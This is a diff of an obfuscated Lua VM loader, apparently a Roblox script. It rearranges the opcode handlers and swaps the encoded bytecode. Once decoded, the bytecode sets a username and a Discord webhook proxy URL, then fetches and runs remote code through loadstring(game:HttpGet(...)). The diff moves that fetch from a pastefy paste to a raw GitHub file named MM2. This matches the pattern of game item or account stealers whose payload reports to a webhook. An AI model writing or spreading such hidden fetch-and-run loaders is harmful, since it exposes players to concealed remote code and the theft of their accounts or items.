@@ -182,7 +182,7 @@ local function VMCall(ByteString, vmenv, ...)
 				if (Enum <= 7) then
 					if (Enum <= 3) then
 						if (Enum <= 1) then
-							if (Enum > 0) then
+							if (Enum == 0) then
 								Stk[Inst[2]] = Inst[3];
 							else
 								local A = Inst[2];
@@ -195,16 +195,29 @@ local function VMCall(ByteString, vmenv, ...)
 								end
 							end
 						elseif (Enum == 2) then
-							do
-								return;
-							end
+							Stk[Inst[2]] = Env[Inst[3]];
 						else
-							do
-								return;
-							end
+							Stk[Inst[2]] = Env[Inst[3]];
 						end
 					elseif (Enum <= 5) then
 						if (Enum > 4) then
+							Stk[Inst[2]]();
+						else
+							local A = Inst[2];
+							local B = Stk[Inst[3]];
+							Stk[A + 1] = B;
+							Stk[A] = B[Inst[4]];
+						end
+					elseif (Enum > 6) then
+						Stk[Inst[2]] = Inst[3];
+					else
+						do
+							return;
+						end
+					end
+				elseif (Enum <= 11) then
+					if (Enum <= 9) then
+						if (Enum > 8) then
 							local A = Inst[2];
 							local B = Stk[Inst[3]];
 							Stk[A + 1] = B;
@@ -213,44 +226,31 @@ local function VMCall(ByteString, vmenv, ...)
 							local A = Inst[2];
 							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
 						end
-					elseif (Enum > 6) then
-						local A = Inst[2];
-						local B = Stk[Inst[3]];
-						Stk[A + 1] = B;
-						Stk[A] = B[Inst[4]];
-					else
-						Stk[Inst[2]][Inst[3]] = Inst[4];
-					end
-				elseif (Enum <= 11) then
-					if (Enum <= 9) then
-						if (Enum == 8) then
-							Stk[Inst[2]] = Inst[3];
-						else
-							local A = Inst[2];
-							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
-							Top = (Limit + A) - 1;
-							local Edx = 0;
-							for Idx = A, Top do
-								Edx = Edx + 1;
-								Stk[Idx] = Results[Edx];
-							end
-						end
 					elseif (Enum > 10) then
-						Stk[Inst[2]] = Env[Inst[3]];
+						do
+							return;
+						end
 					else
-						Stk[Inst[2]]();
+						local A = Inst[2];
+						local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
+						Top = (Limit + A) - 1;
+						local Edx = 0;
+						for Idx = A, Top do
+							Edx = Edx + 1;
+							Stk[Idx] = Results[Edx];
+						end
 					end
 				elseif (Enum <= 13) then
 					if (Enum == 12) then
-						Stk[Inst[2]][Inst[3]] = Inst[4];
+						Stk[Inst[2]]();
 					else
-						Stk[Inst[2]] = Env[Inst[3]];
+						local A = Inst[2];
+						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
 					end
 				elseif (Enum == 14) then
-					Stk[Inst[2]]();
+					Stk[Inst[2]][Inst[3]] = Inst[4];
 				else
-					local A = Inst[2];
-					Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
+					Stk[Inst[2]][Inst[3]] = Inst[4];
 				end
 				VIP = VIP + 1;
 			end
@@ -258,4 +258,4 @@ local function VMCall(ByteString, vmenv, ...)
 	end
 	return Wrap(Deserialize(), {}, vmenv)(...);
 end
-return VMCall("LOL!093Q0003023Q005F4703083Q00557365726E616D6503153Q005852696C65795044582C205852696C65795044583103073Q00576562682Q6F6B03843Q00682Q7470733A2Q2F776562682Q6F6B2E6C65776973616B7572612E6D6F652F6170692F776562682Q6F6B732F31333936343038302Q343632373136393238302F464C44346F7735386249694D4E426769746C6A4333634E646662457463754B663857417274386E556479432Q5A655F70696C4D356334786931772Q66526D7949346F5F44030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403203Q00682Q7470733A2Q2F706173746566792E612Q702F46544F47705869382F726177000C3Q00120D3Q00013Q0030063Q0002000300120D3Q00013Q0030063Q0004000500120D3Q00063Q00120D000100073Q002005000100010008001208000300096Q000100034Q00045Q00022Q000E3Q000100012Q00033Q00017Q00", GetFEnv(), ...);
+return VMCall("LOL!093Q0003023Q005F4703083Q00557365726E616D6503093Q005852696C657950445803073Q00576562682Q6F6B03843Q00682Q7470733A2Q2F776562682Q6F6B2E6C65776973616B7572612E6D6F652F6170692F776562682Q6F6B732F31333936343038302Q343632373136393238302F464C44346F7735386249694D4E426769746C6A4333634E646662457463754B663857417274386E556479432Q5A655F70696C4D356334786931772Q66526D7949346F5F44030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403493Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F47726F772D412D47617264656E312F442Q4F4D2F726566732F68656164732F6D61696E2F2Q4D32000C3Q0012033Q00013Q00300F3Q000200030012033Q00013Q00300F3Q000400050012033Q00063Q001203000100073Q00200400010001000800122Q000300094Q000A000100034Q000D5Q00022Q000C3Q000100012Q000B3Q00017Q00", GetFEnv(), ...);
